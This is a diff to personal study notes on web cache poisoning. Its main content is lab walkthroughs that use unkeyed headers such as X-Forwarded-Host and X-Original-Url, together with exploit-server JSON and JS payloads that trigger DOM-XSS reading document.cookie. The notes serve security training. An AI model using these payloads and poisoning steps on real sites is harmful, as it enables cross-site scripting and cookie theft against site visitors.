@@ -3311,6 +3311,18 @@ LLM -> API: create_email_forwarding_rule('peter')
 - Accept-Encoding: If not considered, could lead to delivering wrong content.
 - X-Forwarded-Proto: Indicates the protocol (HTTP/HTTPS) used by the original client.
 
+**Exploiting**
+- exploiting cache design flaws
+  - delivering an XSS attack
+  - exploit unsafe handling of resource imports
+  - exploit cookie-handling vulnerabilities
+  - using multiple headers
+  - responses that expose too much info
+  - exploiting DOM-based vulnerabilities
+  - chaining web-cache poisoning vulnerabilities 
+- exploiting cache implementation flaws
+  - key flaws
+
 **Mitigation**
 - Include all relevant inputs in the cache key: Ensure that all elements that influence the response (e.g., HTTP headers, query parameters, cookies) are included in the cache key to avoid mixing responses.
 - Normalize URL parameters: Ensure that the cache considers variations in URL query strings.
@@ -3321,7 +3333,7 @@ LLM -> API: create_email_forwarding_rule('peter')
 - Use Secure HTTP Headers: Content Security Policy, X-Content-Type-Options: nosniff, X-Frame-Options
 
 ### Web Cache Poisoning Lab
-- Web cache poisoning with an unkeyed header
+- Web cache poisoning with an **unkeyed header**
   - study the traffic
     ```
     GET /
@@ -3348,7 +3360,7 @@ LLM -> API: create_email_forwarding_rule('peter')
     Files: /resources/js/tracking.js  
     Body: alert(document.cookie)
   - Remove the cache buster and replay the request untill you see your exploit server URL being reflected in the response and X-Cache: hit in the header  
-- Web cache poisoning with an unkeyed cookie
+- Web cache poisoning with an **unkeyed cookie**
   - study the traffic
     ```
     request
@@ -3364,9 +3376,143 @@ LLM -> API: create_email_forwarding_rule('peter')
     `fehost=someString"-alert(1)-"someString`
   - Replay the request until you see the payload in the response and X-Cache: hit in the headers. Load the URL in the browser and confirm the alert() fires
 - Web cache poisoning with multiple headers
-- dd
-- dd
-- dd
+  - param miner > guess headers > 
+    `x-forwarded-scheme`, `x-forwarded-host`
+  - Exploit server
+    file: /resources/js/tracking.js
+    body: alert(document.cookie)
+  - Get response redirect to js location by adding the headers `x-forwarded-scheme`, `x-forwarded-host`
+    ```
+    Request
+    GET /resources/js/tracking.js
+    X-Forwarded-Scheme: HTTPS
+    X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net 
+
+    Response
+    HTTP/2 302 Found
+    Location: https://exploit-0ae1007a047afd7e80440c2f014f00df.exploit-server.net/resources/js/tracking.js
+    ```
+- Web cache poisoning to exploit a **DOM vulnerability** via a cache with **strict cacheability criteria  (Expert)**
+  - GET / > repeater > aram miner > guess headers
+    `x-forwarded-host`
+  - Test cache buster
+    ```
+    GET /cb=1
+    x-forwarded-host: example.com
+ 
+    Response
+    <script type="text/javascript" src="/resources/js/geolocate.js">
+       <script>
+            data = {"host":"example.com","path":"/"}
+        </script>
+    ```
+  - Study geolocate.js - vulnerable to DOM-XSS it handles the json data
+    ```
+    function initGeoLocate(jsonUrl)
+	{
+	    fetch(jsonUrl)
+	        .then(r => r.json())
+	        .then(j => {
+	            let geoLocateContent = document.getElementById('shipping-info');
+	
+	            let img = document.createElement("img");
+	            img.setAttribute("src", "/resources/images/localShipping.svg");
+	            geoLocateContent.appendChild(img)
+	
+	            let div = document.createElement("div");
+	            div.innerHTML = 'Free shipping to ' + j.country;
+	            geoLocateContent.appendChild(div)
+	        });
+	}
+    ```
+  - Exploit server - store
+    ```
+    file: /resources/json/geolocate.json
+    head: Access-Control-Allow-Origin: *
+    Body： { "country": "<img src=1 onerror=alert(document.cookie) />" }
+    ```
+  - Repeater > repeat the request until alert prompt
+    ```
+    GET /
+    X-Forwarded-Host: exploit-0a9200fc046fe3a38005076201470031.exploit-server.net
+    ```
+- **Combining web cache poisoning vulnerabilities (Expert)**
+  - Identify unkeyed headers
+    GET / > repeater > aram miner > guess headers 
+    `x-forwarded-host`，`x-original-url`
+  - Test cache buster
+    ```
+    GET /cb=1
+    x-forwarded-host: example.com
+
+    Response
+    <script type="text/javascript" src="\resources\js\translations.js"></script>
+    <script>
+          data = {"host":"example.com","path":"/"}
+    </script>
+    <script>
+           initTranslations('//' + data.host + '/resources/json/translations.json');
+    </script>
+    ```
+  - Study translations.js - vulnerable to DOM-XSS due to initTranslations() handles data from the JSON file
+    ```
+    /resources/js/translations.js
+
+    function initTranslations(jsonUrl)
+	{
+	...
+	 fetch(jsonUrl)
+	        .then(r => r.json())
+	        .then(j => {
+	            const select = document.getElementById('lang-select');
+	            if (select) {
+	                for (const code in j) {
+	                    const name = j[code].name;
+	                    const el = document.createElement("option");
+	                    el.setAttribute("value", code);
+	                    el.innerText = name;
+	                    select.appendChild(el);
+	                    if (code === lang) {
+	                        select.selectedIndex = select.childElementCount - 1;
+	                    }
+	                }
+	            }
+	
+	            lang in j && lang.toLowerCase() !== 'en' && j[lang].translations && translate(j[lang].translations, document.getElementsByClassName('maincontainer')[0]);
+	        });
+	}
+    ```
+  - Exploit server - store - xss payload
+    ```
+    file: /resources/json/translations.json
+    content-type:Content-Type: application/json; charset=utf-8
+    head: Access-Control-Allow-Origin: *
+    Body:
+	{
+	    "en": {
+	        "name": "English"
+	    },
+	    "es": {
+	        "name": "español",
+	        "translations": {
+	            "Return to list": "Volver a la lista",
+	            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
+	            "Description:": "Descripción"
+	        }
+	    }
+	}
+    ```
+  - Exploit
+    ``` 
+    Step 1: injext dom xss (replay until cache hit)
+    GET /?localized=1 
+    X-Forwarded-Host: exploit-0a2d007e032c974580fd7fd001e700f7.exploit-server.net
+
+    Step 2: redirect to Spanish version (replay until cache hit)
+    GET / HTTP/2
+    X-Original-Url: /setlang\es
+    ```
+  - Site auto redirect to spanish version and get the alert prompt
 - dd
 - dd
 - dd
